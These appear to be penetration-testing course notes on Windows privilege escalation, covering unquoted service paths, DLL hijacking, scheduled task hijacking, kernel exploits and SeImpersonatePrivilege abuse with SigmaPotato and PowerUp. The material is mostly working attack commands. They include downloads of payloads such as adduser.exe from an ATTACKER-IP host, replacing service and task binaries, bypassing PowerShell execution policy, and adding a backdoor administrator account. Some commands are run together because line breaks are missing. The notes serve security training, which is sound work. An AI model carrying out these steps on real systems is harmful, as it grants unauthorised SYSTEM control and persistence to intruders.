net usernet localgroup administrators
```

---

# DLL Hijacking Workflow

```
Find writable application directory        ↓Identify missing DLL        ↓Create malicious DLL        ↓Place DLL in app directory        ↓Wait for privileged execution        ↓Gain admin/SYSTEM
```

---

# 17.2.3 Unquoted Service Paths

# Core Idea

If a service path:

- Contains spaces
- Is NOT quoted

Windows may execute the wrong binary.

---

# Example Vulnerable Path

```
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Windows interprets as:

```
C:\Program.exeC:\Program Files\Enterprise.exeC:\Program Files\Enterprise Apps\Current.exeC:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

If we can write to one of these paths:

→ We can hijack execution.

---

# Enumerate Services

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

---

# WMIC Detection Command

```
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Finds:

- Non-Windows services
- Missing quotes

---

# Check Service Control Permissions

```
Start-Service GammaServiceStop-Service GammaService
```

If allowed → easier exploitation.

---

# Check Writable Directories

```
icacls "C:\Program Files\Enterprise Apps"
```

Look for:

```
(BUILTIN\Users):(W)
```

---

# Exploit

## Transfer Payload

```
iwr -uri http://ATTACKER-IP/adduser.exe -Outfile Current.exe
```

---

## Place Malicious EXE

```
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

---

## Trigger Service

```
Start-Service GammaService
```

---

# Verify Access

```
net usernet localgroup administrators
```

---

# PowerUp Automation

## Download

```
iwr http://ATTACKER-IP/PowerUp.ps1 -Outfile PowerUp.ps1
```

---

## Import

```
powershell -ep bypass. .\PowerUp.ps1
```

---

## Find Vulnerable Services

```
Get-UnquotedService
```

---

## Exploit Automatically

```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

---

## Restart Service

```
Restart-Service GammaService
```

---

# Unquoted Service Path Workflow

```
Find unquoted path        ↓Check writable interpreted paths        ↓Place malicious EXE        ↓Restart service        ↓Gain elevated execution
```

---

# 17.3.1 Scheduled Tasks

# Core Idea

Scheduled tasks may:

- Run as admin/SYSTEM
- Execute writable binaries/scripts

If writable:

→ Replace executable/script → privilege escalation.

---

# Enumerate Tasks

```
schtasks /query /fo LIST /v
```

Interesting fields:

- TaskName
- Task To Run
- Run As User
- Next Run Time
- Author

---

# Example Vulnerable Task

```
Task To Run:C:\Users\steve\Pictures\BackendCacheCleanup.exeRun As User:daveadmin
```

---

# Check Permissions

```
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

---

# Replace Executable

```
iwr -Uri http://ATTACKER-IP/adduser.exe -Outfile BackendCacheCleanup.exe
```

---

# Backup Original

```
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
```

---

# Replace Binary

```
move .\BackendCacheCleanup.exe .\Pictures\
```

---

# Wait for Task Execution

Then verify:

```
net usernet localgroup administrators
```

---

# Scheduled Task Workflow

```
Enumerate tasks        ↓Find high-privileged task        ↓Find writable action binary        ↓Replace executable/script        ↓Wait for trigger        ↓Gain elevated access
```

---

# 17.3.2 Using Exploits

# Types of Privilege Escalation Exploits

## 1. Application Exploits

- Vulnerable installed software
- RCE → elevated execution

---

## 2. Kernel Exploits

Exploit Windows kernel vulnerabilities.

Risk:

- May crash system
- Use carefully during pentests

---

## 3. Privilege Abuse

Abuse dangerous privileges like:

- SeImpersonatePrivilege
- SeBackupPrivilege
- SeDebugPrivilege

---

# System Enumeration

## Current Privileges

```
whoami /priv
```

---

## Windows Version

```
systeminfo
```

---

## Installed Patches

```
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

---

# Kernel Exploit Example

## Run Exploit

```
.\CVE-2023-29360.exe
```

---

## Verify SYSTEM

```
whoami
```

Result:

```
nt authority\system
```

---

# SeImpersonatePrivilege

# Key Concept

Allows impersonation of authenticated clients.

Common in:

- IIS
- Service accounts
- LOCAL SERVICE
- NETWORK SERVICE

---

# Named Pipe Abuse

Attack flow:

```
Create malicious named pipe        ↓Coerce SYSTEM process to connect        ↓Capture token        ↓Impersonate SYSTEM
```

---

# SigmaPotato

Tool abusing:

```
SeImpersonatePrivilege
```

to gain SYSTEM.

---

# Download SigmaPotato

## Kali

```
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exepython3 -m http.server 80
```

---

## Target

```
iwr -uri http://ATTACKER-IP/SigmaPotato.exe -OutFile SigmaPotato.exe
```

---

# Create User via SigmaPotato

```
.\SigmaPotato "net user dave4 lab /add"
```

---

# Add User to Administrators

```
.\SigmaPotato "net localgroup Administrators dave4 /add"
```

---

# Verify

```
net usernet localgroup Administrators
```

---

# Important Enumeration Commands Cheat Sheet

# Services

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

```
wmic service get name,pathname
```

---

# Permissions

```
icacls <path>
```

---

# Scheduled Tasks

```
schtasks /query /fo LIST /v
```

---

# User Privileges

```
whoami /priv
```

---

# Users

```
net user
```

---

# Local Admins

```
net localgroup administrators
```

---

# System Info

```
systeminfo
```

---

# PowerUp

```
Get-UnquotedService
```

```
Write-ServiceBinary
```

---

# Procmon Indicators

Look for:

```
NAME NOT FOUND
```

especially for DLLs.

---

# Common PrivEsc Vectors Covered

|Vector|Key Weakness|
|---|---|
|Service Binary Hijack|Writable service executable|
|DLL Hijacking|Missing/writable DLL|
|Unquoted Service Path|Spaces + no quotes|
|Scheduled Tasks|Writable task executable|
|Kernel Exploit|Missing patches|
|SeImpersonatePrivilege|Token impersonation|